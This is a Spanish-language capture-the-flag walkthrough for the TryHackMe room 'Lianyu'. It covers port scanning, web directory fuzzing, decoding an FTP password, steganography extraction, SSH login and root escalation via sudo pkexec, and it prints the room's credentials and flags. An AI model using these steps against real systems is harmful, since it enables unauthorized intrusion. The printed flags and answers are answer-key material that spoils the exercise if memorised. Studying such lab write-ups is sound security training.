https://tryhackme.com/r/room/lianyu

## Escaneo

```

Deploy the VM and Start the Enumeration.


┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV  -n -Pn --min-rate=9000 -p- -v 10.10.166.25
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 00:59 CDT
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 00:59
Scanning 10.10.166.25 [65535 ports]
 
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp    open  http    Apache httpd
111/tcp   open  rpcbind 2-4 (RPC #100000)
59838/tcp open  status  1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

- buscamos directorios
```
ffuf -u http://10.10.25.102/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 600 -ic 

.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 185ms]
.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 188ms]
island                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 184ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 186ms]
:: Progress: [20476/20476] :: Job [1/1] :: 545 req/sec :: Duration: [0:00:14] :: Errors: 0 ::

```

- en el codigo, econtramos la palabra vigilante
view-source:http://10.10.25.102/island/

```
!DOCTYPE html>
<html>
<body>
<style>
 
</style>
<h1> Ohhh Noo, Don't Talk............... </h1>

<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->

<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>

</body>
</html>

vigilante
```

- busqueda recursiva directorio island, encontramos, 2100
```
ffuf -u http://10.10.25.102/island/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 600 -ic 

    
                        [Status: 200, Size: 345, Words: 41, Lines: 25, Duration: 180ms]
2100                    [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 193ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

- encontramos .ticket
```
view-source:http://10.10.25.102/island/2100/
<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>

<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->

</header>
</body>
</html>

What is the Web Directory you found?
2100

```

- busqueda recursiva con .ticket /island/2100
```
┌──(kali㉿kali)-[/opt]
└─$ ffuf -u http://10.10.160.244/island/2100/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 600 -ic -e .ticket -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.160.244/island/2100/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .ticket 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 600
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 292, Words: 27, Lines: 17, Duration: 179ms]
green_arrow.ticket      [Status: 200, Size: 71, Words: 10, Lines: 7, Duration: 561ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

what is the file name you found?
green_arrow.ticket 

                  
┌──(kali㉿kali)-[/opt]
└─$ curl http://10.10.160.244/island/2100/green_arrow.ticket

This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX

Cyberchef base 58 :
!#th3h00d

what is the FTP Password?
!#th3h00d
```

- entramos por ftp con el user   valiente : !#th3h00d y descargamos los archivos
```
wget -r ftp://10.10.160.244/* --ftp-user=vigilante --ftp-password='!#th3h00d'
```

- examinamos los archivos
```
 cat .other_user 
 
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.

Chosen for a secret experiment, the Army imbued him with enhanced physical powers in an attempt to create metahuman super-soldiers for the U.S. military. Deathstroke became a mercenary soon after the experiment when he defied orders and rescued his friend Wintergreen, who had been sent on a suicide mission by a commanding officer with a grudge.[7] However, Slade kept this career secret from his family, even though his wife was an expert military combat instructor.

A criminal named the Jackal took his younger son Joseph Wilson hostage to force Slade to divulge the name of a client who had hired him as an assassin. Slade refused, claiming it was against his personal honor code. He attacked and killed the kidnappers at the rendezvous. Unfortunately, Joseph's throat was slashed by one of the criminals before Slade could prevent it, destroying Joseph's vocal cords and rendering him mute.

After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, his confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Without his mask, Slade wears an eyepatch to cover his eye.

Slade
```

- reparamos el encabezado de Leave_me_alone
```
hexeditor Leave_me_alone.png

89 50 4E 47 0D 0A 1A 0A

eog Leave_me_alone.png 

password mm parece se no ser util pero lo es para el archivo que sigue
```

- revisamos el archivo aa.jpg
```
stegseek aa.jpg          
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "password"
[i] Original filename: "ss.zip".
[i] Extracting to "aa.jpg.out".

file aa.jpg.out 
aa.jpg.out: Zip archive data, at least v2.0 to extract, compression method=deflate
```

- descomprimimos y revisamos
```
unzip aa.jpg.out 
Archive:  aa.jpg.out
  inflating: passwd.txt              
  inflating: shado    


>> parece que aqui no hay nada util

cat passwd.txt 
This is your visa to Land on Lian_Yu # Just for Fun ***

a small Note about it

Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.

>> un pass aqui, posiblemente para slade

cat shado     
M3tahuman

what is the file name with SSH password?
shado

```

- intentamos ssh como slade / M3tahuman
```
ssh slade@10.10.23.17
The authenticity of host '10.10.23.17 (10.10.23.17)' can't be established.
ED25519 key fingerprint is SHA256:DOqn9NupTPWQ92bfgsqdadDEGbQVHMyMiBUDa0bKsOM.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.23.17' (ED25519) to the list of known hosts.
slade@10.10.23.17's password: 
                              Way To SSH...
                          Loading.........Done.. 
                   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝


        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt 
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
                        --Felicity Smoak


user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}


```

- escalar a root
```
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:~$ sudo /usr/bin/pkexec /bin/bash
root@LianYu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@LianYu:~# cd /root
root@LianYu:~# ls
root.txt
root@LianYu:~# cat root.txt 
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 

THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
                                                                              --DEATHSTROKE
Let me know your comments about this machine :)
I will be available @twitter @User6825

root@LianYu:~# 



root.txt
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}


```